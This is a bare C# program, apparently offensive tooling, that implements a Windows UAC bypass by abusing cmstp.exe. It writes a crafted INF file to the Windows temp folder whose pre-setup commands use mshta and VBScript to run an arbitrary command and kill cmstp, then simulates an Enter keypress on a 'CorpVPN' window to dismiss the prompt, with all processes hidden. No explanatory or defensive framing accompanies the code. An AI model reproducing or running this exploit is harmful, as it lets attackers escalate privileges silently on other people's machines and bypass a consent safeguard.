using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;

class Program
{
    static void Main(string[] args)
    {
        UACBypass(2);
    }

    static void UACBypass(int method)
    {
        if (!IsAdmin())
        {
            if (method == 1)
            {
                Execute();
            }
            else
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd",
                    Arguments = "/k START \"\" \"C:\\YourFile\\tt.exe\" & EXIT",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            Environment.Exit(0);
        }
    }

    static bool IsAdmin()
    {
        using (var identity = WindowsIdentity.GetCurrent())
        {
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }

    static void Execute()
    {
        string binaryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "system32", "cmstp.exe");
        if (!File.Exists(binaryPath))
        {
            return;
        }

        string infFile = SetInfFile("REPLACE_COMMAND_LINE");
        Process.Start(new ProcessStartInfo
        {
            FileName = binaryPath,
            Arguments = $"/au {infFile}",
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        });

        System.Threading.Thread.Sleep(5000);

        string windowTitle = "CorpVPN";
        IntPtr parentHandle = IntPtr.Zero;
        IntPtr childAfter = IntPtr.Zero;
        string className = null;
        User32.PostMessage(User32.FindWindowEx(parentHandle, childAfter, className, windowTitle), User32.WM_KEYDOWN, (IntPtr)User32.VK_RETURN, IntPtr.Zero);
    }

    static string SetInfFile(string commandToExecute)
    {
        string str1 = Path.GetFileNameWithoutExtension(AppDomain.CurrentDomain.FriendlyName);
        string str2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "temp");
        string filePath = Path.Combine(str2, $"{str1}.inf");

        string infContent = Code().Replace("REPLACE_COMMAND_LINE", commandToExecute);

        File.WriteAllText(filePath, infContent);

        return filePath;
    }

    static string Code()
    {
        return @"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Setup Başlamadan Önce Çalıştırılacak Komutlar
mshta vbscript:Execute(""CreateObject('WScript.Shell').Run 'cmd.exe /c start REPLACE_COMMAND_LINE', 0:close"")
mshta vbscript:Execute(""CreateObject('WScript.Shell').Run 'taskkill /IM cmstp.exe /F', 0, true:close"")

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE, ProfileInstallPath, %UnexpectedError%

[Strings]
ServiceName=""CorpVPN""
ShortSvcName=""CorpVPN""
".Replace("###", "");
    }
}

public static class User32
{
    public const int VK_RETURN = 0x0D;
    public const int WM_KEYDOWN = 0x100;

    [DllImport("user32.dll")]
    public static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

    [DllImport("user32.dll")]
    public static extern IntPtr PostMessage(IntPtr hWnd, int Msg, IntPtr wParam, IntPtr lParam);
}